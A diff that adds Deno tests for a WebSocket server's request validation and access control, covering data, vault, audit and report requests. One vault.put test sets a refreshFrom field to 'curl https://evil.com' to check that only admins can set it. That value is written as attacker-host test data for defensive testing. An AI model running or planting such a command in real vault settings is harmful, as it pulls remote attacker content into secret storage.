@@ -1085,3 +1085,514 @@ Deno.test("authorizeOrReject: missing snapshot loader rejects in token mode", ()
     "access_not_configured",
   );
 });
+
+// ── validateServerRequest: new data/model/workflow/vault/report types ────
+
+Deno.test("validateServerRequest accepts data.get", () => {
+  const input = {
+    type: "data.get",
+    id: "req-dg-1",
+    payload: { modelIdOrName: "hello", dataName: "result" },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts data.get with optional fields", () => {
+  const input = {
+    type: "data.get",
+    id: "req-dg-2",
+    payload: { workflowName: "deploy", runId: "latest", version: 2 },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts data.query", () => {
+  const input = {
+    type: "data.query",
+    id: "req-dq-1",
+    payload: { predicate: 'modelType == "command/shell"' },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest rejects data.query without predicate", () => {
+  const input = {
+    type: "data.query",
+    id: "req-dq-2",
+    payload: {},
+  };
+  assertEquals(typeof validateServerRequest(input), "string");
+});
+
+Deno.test("validateServerRequest accepts data.list", () => {
+  const input = {
+    type: "data.list",
+    id: "req-dl-1",
+    payload: { modelIdOrName: "hello" },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts model.search", () => {
+  const input = {
+    type: "model.search",
+    id: "req-ms-1",
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts model.search with query", () => {
+  const input = {
+    type: "model.search",
+    id: "req-ms-2",
+    payload: { query: "hello" },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts model.method.describe", () => {
+  const input = {
+    type: "model.method.describe",
+    id: "req-md-1",
+    payload: { modelIdOrName: "hello", methodName: "execute" },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest rejects model.method.describe without methodName", () => {
+  const input = {
+    type: "model.method.describe",
+    id: "req-md-2",
+    payload: { modelIdOrName: "hello" },
+  };
+  assertEquals(typeof validateServerRequest(input), "string");
+});
+
+Deno.test("validateServerRequest accepts workflow.search", () => {
+  const input = {
+    type: "workflow.search",
+    id: "req-ws-1",
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts vault.get", () => {
+  const input = {
+    type: "vault.get",
+    id: "req-vg-1",
+    payload: { vaultNameOrId: "default" },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest rejects vault.get without vaultNameOrId", () => {
+  const input = {
+    type: "vault.get",
+    id: "req-vg-2",
+    payload: {},
+  };
+  assertEquals(typeof validateServerRequest(input), "string");
+});
+
+Deno.test("validateServerRequest accepts vault.put", () => {
+  const input = {
+    type: "vault.put",
+    id: "req-vp-1",
+    payload: { vaultName: "default", key: "API_KEY", value: "secret" },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest rejects vault.put without value", () => {
+  const input = {
+    type: "vault.put",
+    id: "req-vp-2",
+    payload: { vaultName: "default", key: "API_KEY" },
+  };
+  assertEquals(typeof validateServerRequest(input), "string");
+});
+
+Deno.test("validateServerRequest accepts audit.timeline", () => {
+  const input = {
+    type: "audit.timeline",
+    id: "req-at-1",
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts audit.timeline with options", () => {
+  const input = {
+    type: "audit.timeline",
+    id: "req-at-2",
+    payload: { hours: 4, showAll: true },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts summarise", () => {
+  const input = {
+    type: "summarise",
+    id: "req-sum-1",
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts report.get", () => {
+  const input = {
+    type: "report.get",
+    id: "req-rg-1",
+    payload: { reportName: "cost-summary" },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest rejects report.get without reportName", () => {
+  const input = {
+    type: "report.get",
+    id: "req-rg-2",
+    payload: {},
+  };
+  assertEquals(typeof validateServerRequest(input), "string");
+});
+
+Deno.test("validateServerRequest accepts report.search", () => {
+  const input = {
+    type: "report.search",
+    id: "req-rs-1",
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts report.search with filters", () => {
+  const input = {
+    type: "report.search",
+    id: "req-rs-2",
+    payload: { query: "cost", labels: ["summary"] },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts report.describe", () => {
+  const input = {
+    type: "report.describe",
+    id: "req-rd-1",
+    payload: { reportName: "cost-summary" },
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+Deno.test("validateServerRequest accepts report.type.search", () => {
+  const input = {
+    type: "report.type.search",
+    id: "req-rts-1",
+  };
+  assertEquals(typeof validateServerRequest(input), "object");
+});
+
+// ── Authorization: new request types ────────────────────────────────────
+
+Deno.test("authorizeOrReject: data.get rejected without read grant", () => {
+  const mock = createMockSocket();
+  const active = new Map<string, AbortController>();
+  const ctx = makeCtx(modeTokenConfig, []);
+
+  handleMessage(
+    mock as unknown as WebSocket,
+    ctx,
+    active,
+    makeEvent(JSON.stringify({
+      type: "data.get",
+      id: "auth-dg-1",
+      payload: { modelIdOrName: "hello", dataName: "result" },
+    })),
+    testPrincipal,
+  );
+
+  assertEquals(mock.sent.length, 1);
+  const msg = parseSent(mock);
+  assertEquals(msg.type, "error");
+  assertEquals((msg.error as Record<string, unknown>).code, "unauthorized");
+  assertStringIncludes(
+    String((msg.error as Record<string, unknown>).message),
+    "data:hello",
+  );
+});
+
+Deno.test("authorizeOrReject: data.query rejected without read grant", () => {
+  const mock = createMockSocket();
+  const active = new Map<string, AbortController>();
+  const ctx = makeCtx(modeTokenConfig, []);
+
+  handleMessage(
+    mock as unknown as WebSocket,
+    ctx,
+    active,
+    makeEvent(JSON.stringify({
+      type: "data.query",
+      id: "auth-dq-1",
+      payload: { predicate: "size > 0" },
+    })),
+    testPrincipal,
+  );
+
+  assertEquals(mock.sent.length, 1);
+  const msg = parseSent(mock);
+  assertEquals(msg.type, "error");
+  assertEquals((msg.error as Record<string, unknown>).code, "unauthorized");
+  assertStringIncludes(
+    String((msg.error as Record<string, unknown>).message),
+    "data:*",
+  );
+});
+
+Deno.test("authorizeOrReject: model.search rejected without read grant", () => {
+  const mock = createMockSocket();
+  const active = new Map<string, AbortController>();
+  const ctx = makeCtx(modeTokenConfig, []);
+
+  handleMessage(
+    mock as unknown as WebSocket,
+    ctx,
+    active,
+    makeEvent(JSON.stringify({
+      type: "model.search",
+      id: "auth-ms-1",
+    })),
+    testPrincipal,
+  );
+
+  assertEquals(mock.sent.length, 1);
+  const msg = parseSent(mock);
+  assertEquals(msg.type, "error");
+  assertEquals((msg.error as Record<string, unknown>).code, "unauthorized");
+  assertStringIncludes(
+    String((msg.error as Record<string, unknown>).message),
+    "model:*",
+  );
+});
+
+Deno.test("authorizeOrReject: vault.get rejected without read grant", () => {
+  const mock = createMockSocket();
+  const active = new Map<string, AbortController>();
+  const ctx = makeCtx(modeTokenConfig, []);
+
+  handleMessage(
+    mock as unknown as WebSocket,
+    ctx,
+    active,
+    makeEvent(JSON.stringify({
+      type: "vault.get",
+      id: "auth-vg-1",
+      payload: { vaultNameOrId: "default" },
+    })),
+    testPrincipal,
+  );
+
+  assertEquals(mock.sent.length, 1);
+  const msg = parseSent(mock);
+  assertEquals(msg.type, "error");
+  assertEquals((msg.error as Record<string, unknown>).code, "unauthorized");
+  assertStringIncludes(
+    String((msg.error as Record<string, unknown>).message),
+    "data:vault",
+  );
+});
+
+Deno.test("authorizeOrReject: vault.put rejected without write grant", () => {
+  const mock = createMockSocket();
+  const active = new Map<string, AbortController>();
+  const ctx = makeCtx(modeTokenConfig, []);
+
+  handleMessage(
+    mock as unknown as WebSocket,
+    ctx,
+    active,
+    makeEvent(JSON.stringify({
+      type: "vault.put",
+      id: "auth-vp-1",
+      payload: { vaultName: "default", key: "K", value: "V" },
+    })),
+    testPrincipal,
+  );
+
+  assertEquals(mock.sent.length, 1);
+  const msg = parseSent(mock);
+  assertEquals(msg.type, "error");
+  assertEquals((msg.error as Record<string, unknown>).code, "unauthorized");
+  assertStringIncludes(
+    String((msg.error as Record<string, unknown>).message),
+    "data:vault",
+  );
+});
+
+Deno.test("authorizeOrReject: vault.put with refreshFrom requires admin", () => {
+  const mock = createMockSocket();
+  const active = new Map<string, AbortController>();
+  const writeGrant = makeGrant({
+    subject: { kind: "user", name: "adam" },
+    actions: ["write"],
+    resource: { kind: "data", pattern: "vault" },
+  });
+  const ctx = makeCtx(modeTokenConfig, [writeGrant]);
+
+  handleMessage(
+    mock as unknown as WebSocket,
+    ctx,
+    active,
+    makeEvent(JSON.stringify({
+      type: "vault.put",
+      id: "auth-vp-refresh-1",
+      payload: {
+        vaultName: "default",
+        key: "K",
+        value: "V",
+        refreshFrom: "curl https://evil.com",
+      },
+    })),
+    testPrincipal,
+  );
+
+  assertEquals(mock.sent.length, 1);
+  const msg = parseSent(mock);
+  assertEquals(msg.type, "error");
+  assertEquals((msg.error as Record<string, unknown>).code, "unauthorized");
+  assertStringIncludes(
+    String((msg.error as Record<string, unknown>).message),
+    "admin",
+  );
+});
+
+Deno.test("authorizeOrReject: vault.put with clearRefresh requires admin", () => {
+  const mock = createMockSocket();
+  const active = new Map<string, AbortController>();
+  const writeGrant = makeGrant({
+    subject: { kind: "user", name: "adam" },
+    actions: ["write"],
+    resource: { kind: "data", pattern: "vault" },
+  });
+  const ctx = makeCtx(modeTokenConfig, [writeGrant]);
+
+  handleMessage(
+    mock as unknown as WebSocket,
+    ctx,
+    active,
+    makeEvent(JSON.stringify({
+      type: "vault.put",
+      id: "auth-vp-clear-1",
+      payload: {
+        vaultName: "default",
+        key: "K",
+        value: "V",
+        clearRefresh: true,
+      },
+    })),
+    testPrincipal,
+  );
+
+  assertEquals(mock.sent.length, 1);
+  const msg = parseSent(mock);
+  assertEquals(msg.type, "error");
+  assertEquals((msg.error as Record<string, unknown>).code, "unauthorized");
+  assertStringIncludes(
+    String((msg.error as Record<string, unknown>).message),
+    "admin",
+  );
+});
+
+Deno.test("authorizeOrReject: vault.put with empty refreshFrom requires admin", () => {
+  const mock = createMockSocket();
+  const active = new Map<string, AbortController>();
+  const writeGrant = makeGrant({
+    subject: { kind: "user", name: "adam" },
+    actions: ["write"],
+    resource: { kind: "data", pattern: "vault" },
+  });
+  const ctx = makeCtx(modeTokenConfig, [writeGrant]);
+
+  handleMessage(
+    mock as unknown as WebSocket,
+    ctx,
+    active,
+    makeEvent(JSON.stringify({
+      type: "vault.put",
+      id: "auth-vp-empty-refresh",
+      payload: {
+        vaultName: "default",
+        key: "K",
+        value: "V",
+        refreshFrom: "",
+      },
+    })),
+    testPrincipal,
+  );
+
+  assertEquals(mock.sent.length, 1);
+  const msg = parseSent(mock);
+  assertEquals(msg.type, "error");
+  assertEquals((msg.error as Record<string, unknown>).code, "unauthorized");
+  assertStringIncludes(
+    String((msg.error as Record<string, unknown>).message),
+    "admin",
+  );
+});
+
+Deno.test("authorizeOrReject: audit.timeline rejected without read grant", () => {
+  const mock = createMockSocket();
+  const active = new Map<string, AbortController>();
+  const ctx = makeCtx(modeTokenConfig, []);
+
+  handleMessage(
+    mock as unknown as WebSocket,
+    ctx,
+    active,
+    makeEvent(JSON.stringify({
+      type: "audit.timeline",
+      id: "auth-at-1",
+    })),
+    testPrincipal,
+  );
+
+  assertEquals(mock.sent.length, 1);
+  const msg = parseSent(mock);
+  assertEquals(msg.type, "error");
+  assertEquals((msg.error as Record<string, unknown>).code, "unauthorized");
+  assertStringIncludes(
+    String((msg.error as Record<string, unknown>).message),
+    "model:*",
+  );
+});
+
+Deno.test("authorizeOrReject: admin on access:* grants data.get (superuser)", () => {
+  const mock = createMockSocket();
+  const active = new Map<string, AbortController>();
+  const grant = makeGrant({
+    subject: { kind: "user", name: "adam" },
+    actions: ["admin"],
+    resource: { kind: "access", pattern: "*" },
+  });
+  const ctx = makeCtx(modeTokenConfig, [grant]);
+
+  handleMessage(
+    mock as unknown as WebSocket,
+    ctx,
+    active,
+    makeEvent(JSON.stringify({
+      type: "data.get",
+      id: "auth-dg-admin",
+      payload: { modelIdOrName: "hello", dataName: "result" },
+    })),
+    testPrincipal,
+  );
+
+  const unauthorizedErrors = mock.sent
+    .map((s) => JSON.parse(s))
+    .filter((m) =>
+      m.type === "error" &&
+      (m.error as Record<string, unknown>).code === "unauthorized"
+    );
+  assertEquals(
+    unauthorizedErrors.length,
+    0,
+    "admin superuser should not be denied data.get",
+  );
+});
